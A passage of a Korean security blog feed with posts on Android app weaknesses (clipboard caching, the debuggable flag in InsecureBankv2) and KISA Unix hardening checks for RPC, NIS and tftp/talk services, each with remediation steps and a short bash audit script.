<p>만약 악의적인 애플리케이션이 설치되어 있다면 클립보드에 저장된 데이터를 가져갈 수 있습니다.</p>
<br>

<img src="/images/Android/안드로이드 키보드 캐시 이슈/clipper.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-대응-방안"><a href="#🔒-대응-방안" class="headerlink" title="🔒 대응 방안"></a>🔒 대응 방안</h1><br>

<p>중요한 정보는 마스킹 처리를 통해 사용자가 복사를 하지 못하도록 해야합니다.</p>
<br>

<h2 id="activity-do-transfer-xml"><a href="#activity-do-transfer-xml" class="headerlink" title="activity_do_transfer.xml"></a>activity_do_transfer.xml</h2><br>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">/* activity_do_transfer.xml 일부 */</span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">FrameLayout</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">&quot;0dp&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_weight</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:id</span>=<span class="string">&quot;@+id/editText_from&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:layout_width</span>=<span class="string">&quot;fill_parent&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:layout_marginLeft</span>=<span class="string">&quot;00dip&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:layout_marginRight</span>=<span class="string">&quot;20dip&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:layout_weight</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:editable</span>=<span class="string">&quot;false&quot;</span> //속성 추가</span></span><br><span class="line"><span class="tag">                <span class="attr">android:singleLine</span>=<span class="string">&quot;true&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">EditText</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">FrameLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<p><code>activity_do_transfer.xml</code> 소스코드 일부분입니다.</p>
<p><code>&lt;EditText&gt;</code> 안에 <code>android:editable=&quot;false&quot;</code> 속성을 추가해 주면 사용자가 데이터를 변경 혹은 복사를 할 수 없게 됩니다.</p>
<br>

<br>

<hr>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>모바일</tag>
      </tags>
  </entry>
  <entry>
    <title>[안드로이드 취약점] 애플리케이션 디버깅 기능</title>
    <url>/2022/01/11/2022-01-11-%5B%EC%95%88%EB%93%9C%EB%A1%9C%EC%9D%B4%EB%93%9C%20%EC%B7%A8%EC%95%BD%EC%A0%90%5D%20%EC%95%A0%ED%94%8C%EB%A6%AC%EC%BC%80%EC%9D%B4%EC%85%98%20%EB%94%94%EB%B2%84%EA%B9%85%20%EA%B8%B0%EB%8A%A5/</url>
    <content><![CDATA[<h1 id="🤔-애플리케이션-디버깅-기능"><a href="#🤔-애플리케이션-디버깅-기능" class="headerlink" title="🤔  애플리케이션 디버깅 기능?"></a>🤔  애플리케이션 디버깅 기능?</h1><br>

<p>안드로이드 디버깅 모드의 설정 여부에 따라 발생하는 취약점입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔎-취약점-진단"><a href="#🔎-취약점-진단" class="headerlink" title="🔎 취약점 진단"></a>🔎 취약점 진단</h1><br>

<blockquote>
<p>본 취약점 점검 앱은 <code>Insecurebankv2</code>로 진행합니다.</p>
</blockquote>
<br>

<br>

<p>해당 취약점은 애플리케이션이 제작되는 과정에서 주로 발생합니다.</p>
<p>애플리케이션을 개발 중에 편의상 디버깅 옵션을 <code>true</code>로 지정해 사용합니다.</p>
<p>이를 수정 없이 그대로 배포하면 애플리케이션은 중대한 보안 결함이 발생할 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="💡-점검-방법"><a href="#💡-점검-방법" class="headerlink" title="💡 점검 방법"></a>💡 점검 방법</h1><br>

<h2 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h2><br>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">/* AndroidManifest.xml 일부 */</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">application</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:debuggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:theme</span>=<span class="string">&quot;@android:style/Theme.Holo.Light.DarkActionBar&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<p><code>android:debuggable</code> 옵션을 보면 <code>true</code>로 설정되어 있습니다.</p>
<p>해당 옵션이 <code>true</code>이면 디버깅이 가능합니다.</p>
<br>

<br>

<h2 id="drozer-취약점-확인"><a href="#drozer-취약점-확인" class="headerlink" title="drozer 취약점 확인"></a>drozer 취약점 확인</h2><br>

<p><code>drozer</code>로 <code>debuggable</code> 취약점이 있는지 확인해보았습니다.</p>
<br>

<img src="/images/Android/애플리케이션 디버깅 기능/drozer.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-대응-방안"><a href="#🔒-대응-방안" class="headerlink" title="🔒 대응 방안"></a>🔒 대응 방안</h1><br>

<p><code>android:debuggable</code> 옵션을 <code>false</code>로 설정해줍니다.</p>
<p>개발자가 애플리케이션을 배포하기 전 해당 옵션을 확인해주어야합니다.</p>
<br>

<br>

<hr>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>모바일</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-27 RPC 서비스 확인</title>
    <url>/2022/01/11/2022-01-11-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-27%20RPC%20%EC%84%9C%EB%B9%84%EC%8A%A4%20%ED%99%95%EC%9D%B8/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>불필요한 <code>RPC</code> 서비스의 실행 여부 점검입니다.</p>
<p>항목코드는 <code>U-27</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<h2 id="RPC"><a href="#RPC" class="headerlink" title="RPC?"></a>RPC?</h2><br>

<p>Remote Procedure Call의 약자로 별도의 원격 제어를 위한 코딩 없이 다른 주소 공간에서 함수나 프로시저를 실행할 수 있게하는 프로세스 간 통신 기술입니다.</p>
<p><code>RPC</code>를 이용하면 프로그래머는 함수가 실행 프로그램에 로컬 위치에 있든 원격 위치에 있든 동일한 코드를 이용할 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>다양한 취약성(버퍼 오버플로우, DOS, 원격실행 등)이 존재하는 <code>RPC</code> 서비스를 점검하여 해당 서비스를 비활성화 하도록 합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>버퍼 오버플로우, Dos, 원격실행 등의 취약성이 존재하는 <code>RPC</code> 취약점을 통해 비인가자의 root 권한 획득 및 침해사고 발생 위험이 있으므로 서비스를 중지해야합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.102</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 불필요한 <code>RPC</code> 서비스가 비활성화 되어 있는 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 불필요한 <code>RPC</code> 서비스가 활성화 되어 있는 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>LINUX, AIX,<br />HP-UX,<br />SOLARIS 5.9<br />이하 버전</td>
<td>불필요한 <code>RPC</code> 서비스 비활성화 여부 확인<br />    <code># cat /etc/inetd.conf</code></td>
</tr>
<tr>
<td>LINUX (xinetd)</td>
<td><code>/etc/xinetd.d</code> 디렉터리 내 서비스별 파일 비활성화 여부 확인<br />    <code># vi /etc/xinetd.d/[서비스별 파일명]</code></td>
</tr>
<tr>
<td>SOLARIS 5.10<br />이상 버전</td>
<td><code>RPC</code> 서비스 관련 데몬 확인<br />    <code># inetadm | grep rpc | grep enabled | egrep &quot;ttdbserver|rex|rstart|rusers|spray|wall|rquota&quot;</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># ls /etc/xinetd.d/</p>
</blockquote>
<br>

<p><code>/etc/xinetd.d/</code> 디렉터리 내 서비스를 확인하였습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-27/ls.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>파일</th>
<th>조치 방법</th>
</tr>
</thead>
<tbody><tr>
<td>LINUX, AIX,<br />HP-UX, <br />SOLARIS 5.9<br />이하 버전</td>
<td>1) <code>/etc/inetd.conf</code> 파일에서 해당 라인 주석처리<br /><br />2) <code>inetd</code> 서비스 재시작<br />    <code># ps -ef | grep inetd</code><br />    <code># kill -HUP [PID]</code></td>
</tr>
<tr>
<td>LINUX (xinetd)</td>
<td>1) vi 편집기를 사용하여 <code>/etc/xinetd.d/</code> 디렉터리 내의 불필요한 <code>RPC</code> 서비스 파일 열기<br /><br />2) 서비스 끄기<br /><br />3) <code>xinetd</code> 서비스 재시작</td>
</tr>
<tr>
<td>SOLARIS 5.10<br />이상 버전</td>
<td>1) 불필요한 <code>RPC</code> 서비스 관련 데몬 확인<br /><br />2) <code>svcadm disable &quot;중지하고자 하는 데몬&quot;</code> 명령으로 서비스 데몬 중지<br />    <code># inetadm -d svc:/network/rpc/rusers:default</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">process=`ls /etc/xinetd.d/`</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-27 [RPC 서비스 확인]<span class="string">&quot;\n&quot;</span>:::서비스 목록:::<span class="string">&quot;\n&quot;</span><span class="string">&quot;<span class="variable">$process</span>&quot;</span> | tee /root/result/u-27.txt</span><br></pre></td></tr></table></figure>

<br>

<p>점검자가 불필요한 <code>RPC</code> 서비스를 판단할 수 없기 때문에 해당 스크립트를 사용하면 <code>/etc/xinetd.d/</code> 디렉터리 내 서비스 파일들을 출력하도록 만들었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-27</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-27/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-28 NIS, NIS+ 점검</title>
    <url>/2022/01/11/2022-01-11-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-28%20NIS,%20NIS+%20%EC%A0%90%EA%B2%80/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>안전하지 않은 <code>NIS</code> 서비스의 비활성화, 안전한 <code>NIS+</code> 서비스의 활성화 여부 점검입니다.</p>
<p>항목코드는 <code>U-28</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<h2 id="NIS-NIS"><a href="#NIS-NIS" class="headerlink" title="NIS, NIS+ ?"></a>NIS, NIS+ ?</h2><br>

<p>Network Information System의 약자로 하나의 사용자 계정과 패스워드, 그룹 등을 공유하여 다른 시스템에 제공하는 서비스입니다.</p>
<br>

<p><code>NIS+</code> 는 기존의 <code>NIS</code>에 보안을 강화한 것으로 RPC에서 데이터의 암호화와 인증을 지원합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>안전하지 않은 <code>NIS</code> 서비스의 비활성화 하고 안전한 <code>NIS+</code> 서비스를 활성화하여 시스템 보안수준을 향상하기 위한 목적입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>보안상 취약한 서비스인 <code>NIS</code>를 사용하는 경우 비인가자가 타시스템의 root 권한 획득이 가능하므로 사용하지 않는 것이 바람직하나 만약 <code>NIS</code>를 사용해야 하는 경우 사용자 정보보안에 많은 문제점을 내포하고 있는 <code>NIS</code>보다 <code>NIS+</code>를 사용하는 것을 권장합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.102</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : <code>NIS</code> 서비스가 비활성화 되어 있거나, 필요 시 <code>NIS+</code>를 사용하는 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : <code>NIS</code> 서비스가 활성화 되어 있는 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>LINUX, AIX,<br />HP-UX,<br />SOLARIS 5.9<br />이하 버전</td>
<td><code>NIS, NIS+</code> 서비스 구동 확인<br />    <code># ps -ef | egrep &quot;ypserv|ypbind|ypxfrd|rpc.yppasswdd|rpc.ypupdated&quot;</code></td>
</tr>
<tr>
<td>SOLARIS 5.10<br />이상 버전</td>
<td>서비스 데몬 구동 여부 확인<br />    <code># svcs -a | grep nis</code></td>
</tr>
</tbody></table>
<br>

<br>

<table>
<thead>
<tr>
<th>NIS 관련 서비스 데몬</th>
<th>설명</th>
</tr>
</thead>
<tbody><tr>
<td>ypserv</td>
<td>master와 slave 서버에서 실행되며 클라이언트로부터의 ypbind 요청에 응답</td>
</tr>
<tr>
<td>ypbind</td>
<td>모든 NIS 시스템에서 실행되며 클라이언트와 서버를 바인딩하고 초기화함</td>
</tr>
<tr>
<td>rpc.yppasswdd</td>
<td>사용자들이 패스워드를 변경하기 위해 사용</td>
</tr>
<tr>
<td>ypxfrd</td>
<td>NIS 마스터 서버에서만 실행되며 고속으로 NIS 맵 전송</td>
</tr>
<tr>
<td>rpc.ypupdated</td>
<td>NIS 마스터 서버에서만 실행되며 고속으로 암호화하여 NIS 맵 전송</td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># ps -e | egrep &quot;ypserv|ypbind|ypxfrd|rpc.yppasswdd|rpc.ypupdated&quot;</p>
</blockquote>
<br>

<p><code>NIS</code> 관련 서비스 프로세스를 확인해줍니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-28/ps.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>파일</th>
<th>조치 방법</th>
</tr>
</thead>
<tbody><tr>
<td>LINUX, AIX,<br />SOLARIS 5.9<br />이하 버전</td>
<td>1) <code>NFS</code> 서비스 데몬 중지<br />    <code># kill -9 [PID]</code><br /><br />2) 시동 스크립트 삭제 또는 스크립트 이름 변경<br />    - 위치 확인<br />        <code># ls -al /etc/rc.d/rc*.d/* | egrep &quot;ypserv|ypbind|ypxfrd|rpc.yppasswdd|rpc.ypupdated&quot;</code><br />    - 이름 변경<br />        <code># mv /etc/rc.d/rc2.d/S73ypbind /etc/rc.d/rc2.d/_S73ypbind</code></td>
</tr>
<tr>
<td>HP-UX</td>
<td>1) <code>NFS</code> 서비스 데몬 중지<br />    <code># kill -9 [PID]</code><br /><br />2) 시동 스크립트 삭제 또는 스크립트 이름 변경<br />    - 위치 확인<br />        <code># ls -al /etc/rc.d/rc*.d/* |egrep &quot;ypserv|ypbind|ypxfrd|rpc.yppasswdd|rpc.ypupdated&quot;</code><br />    - <code>/etc/rc.config.d/namesvrs</code> 파일에서 <code>NIS_MASTER_SERVER</code> <code>NIS_SLAVE_SERVER</code> <code>NIS_CLIENT</code> 값을 0으로 설정</td>
</tr>
<tr>
<td>SOLARIS 5.10<br />이상 버전</td>
<td>1) <code>NIS</code> 관련 서비스 데몬 확인<br />    <code>online 16:44:06 svc:/network/nis/client:default</code><br /><br />2) <code>svcadm disable &quot;중지하고자 하는 데몬&quot;</code> 명령으로 서비스 데몬 중지<br />    <code>#svcadm disable svc:/network/nis/server:fefault</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`ps -e | egrep <span class="string">&quot;ypserv|ypbind|ypxfrd|rpc.yppasswdd|rpc.ypupdated&quot;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-28 [NIS, NIS+ 점검] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-28.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>ypserv</code> <code>ypbind</code> <code>ypxfrd</code> <code>rpc.yppasswdd</code> <code>rpc.ypupdated</code> 프로세스를 확인하고 해당 프로세스가 있으면 <code>취약</code> 없으면 <code>양호</code>처리 했습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-28</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-28/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-29 tftp, talk 서비스 비활성화</title>
    <url>/2022/01/12/2022-01-12-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-29%20tftp,%20talk%20%EC%84%9C%EB%B9%84%EC%8A%A4%20%EB%B9%84%ED%99%9C%EC%84%B1%ED%99%94/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p><code>tftp</code> <code>talk</code> 등의 서비스를 사용하지 않거나 취약점이 발표된 서비스의 활성화 여부 점검입니다.</p>
<p>항목코드는 <code>U-29</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<h2 id="tftp-talk"><a href="#tftp-talk" class="headerlink" title="tftp, talk ?"></a>tftp, talk ?</h2><br>

<p><code>tftp</code>는 Trivial File Transfer Protocol의 약자로 <code>ftp</code>와 마찬가지로 파일을 전송하기 위한 프로토콜이지만 <code>ftp</code>보다 더 단순한 방식으로 파일을 전송합니다.</p>
<br>

<p><code>talk</code>는 터미널에서 다른 사용자와 대화할 수 있는 채팅 프로그램입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>안전하지 않거나 불필요한 서비스를 제거함으로써 시스템 보안성 및 리소스의 효율적으로 운용하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>사용하지 않는 서비스나 취약점이 발표된 서비스 운용 시 공격 시도가 가능합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.102</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : <code>tftp</code> <code>talk</code> <code>ntalk</code> 서비스가 비활성화 되어 있는 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : <code>tftp</code> <code>talk</code> <code>ntalk</code> 서비스가 활성화 되어 있는 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>LINUX, AIX,<br />HP-UX,<br />SOLARIS 5.9<br />이하 버전</td>
<td>불필요한 서비스 데몬 확인<br />    <code># cat /etc/inetd.conf | grep &quot;tftp|talk|ntalk&quot;</code></td>
</tr>
<tr>
<td>LINUX (xinetd)</td>
<td><code>tftp</code> <code>talk</code> <code>ntalk</code> 서비스 활성화 여부 확인<br />    <code># vi /etc/xinetd.d/tftp</code><br />    <code># vi /etc/xinetd.d/talk</code><br />    <code># vi /etc/xinetd.d/ntalk</code></td>
</tr>
<tr>
<td>SOLARIS 5.10<br />이상 버전</td>
<td>서비스 데몬 확인<br />    <code># inetadm | egrep &quot;tftp|talk&quot;</code></td>
</tr>
</tbody></table>
<br>

<br>

<table>
<thead>
<tr>
<th>서비스</th>
<th>설명</th>
</tr>
</thead>
<tbody><tr>
<td>tftp (69)</td>
<td>파일 전송을 위한 프로토콜로서 FTP 서비스 보다 구조가 단순하며 적은 양의 데이터를 보낼 때 사용됨<br />주로 원격의 부팅파일을 불러오거나 설치 프로세스를 시작하기 위한 초기 데이터 호출 용도로 사용.<br />서비스 사용시 인증절차가 없어 보안에 취약함</td>
</tr>
<tr>
<td>talk (517)</td>
<td>사용자가 시스템에 원격으로 연결하여 다른 시스템에 로그인하고 있는 사용자와 대화 세션을 시작할 수 있음</td>
</tr>
<tr>
<td>ntalk (518)</td>
<td>서로 다른 시스템 간에 채팅을 가능하게 하는 서비스</td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># netstat -lnup | grep -e 69 -e 517 -e 518</p>
</blockquote>
<br>

<p><code>tftp(69)</code> <code>talk(517)</code> <code>ntalk(518)</code> 서비스 활성화 상태인지 포트로 확인했습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-29/netstat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>파일</th>
<th>조치 방법</th>
</tr>
</thead>
<tbody><tr>
<td>LINUX, AIX,<br />SOLARIS 5.9<br />이하 버전</td>
<td>1) vi 편집기를 이용하여 <code>/etc/inetd.conf</code> 파일 열기<br />    <code># vi /etc/inetd.conf</code><br /><br />2) <code>tftp</code> <code>talk</code> <code>ntalk</code> 서비스 주석 처리<br /><br />3) <code>inetd</code> 데몬 재시작<br />    AIX) <code># refresh -s inetd</code><br />    HP-UX) <code># inetd -c</code><br />    LINUX, SOLARIS) <code># kill -HUP [inetd pid]</code></td>
</tr>
<tr>
<td>LINUX (xinetd)</td>
<td>1) vi 편집기를 이용하여 <code>/etc/xinetd.d/</code> 디렉터리 내 <code>tftp</code> <code>talk</code> <code>ntalk</code> 파일 열기<br /><br />2) 아래와 같이 설정 <code>Disable = yes</code> 설정<br />    <img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-29/vi.png"><br /><br />3) <code>xinetd</code> 서비스 재시작<br />    <code># service xinetd restart</code></td>
</tr>
<tr>
<td>SOLARIS 5.10<br />이상 버전</td>
<td>1) 불필요한 서비스 데몬 확인<br />    <code>svc:/network/tftp:default</code><br /><br />2) <code>inetadm -d &quot;중지하고자 하는 데몬&quot;</code> 명령으로 서비스 데몬 중지<br />    <code># inetadm -d svc:/network/tftp:default</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">PortResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">port=`netstat -lnup | grep -e 69 -e 517 -e 518`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$port</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        PortResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        PortResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-29 [tftp, talk 서비스 비활성화] : <span class="string">&quot;<span class="variable">$PortResult</span>&quot;</span> | tee /root/result/u-29.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>tftp(69)</code> <code>talk(517)</code> <code>ntalk(518)</code> 포트가 활성화 되어있으면 <code>취약</code> 없으면 <code>양호</code>처리 했습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-29</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-29/script.png">

<br>

<br>

<hr>
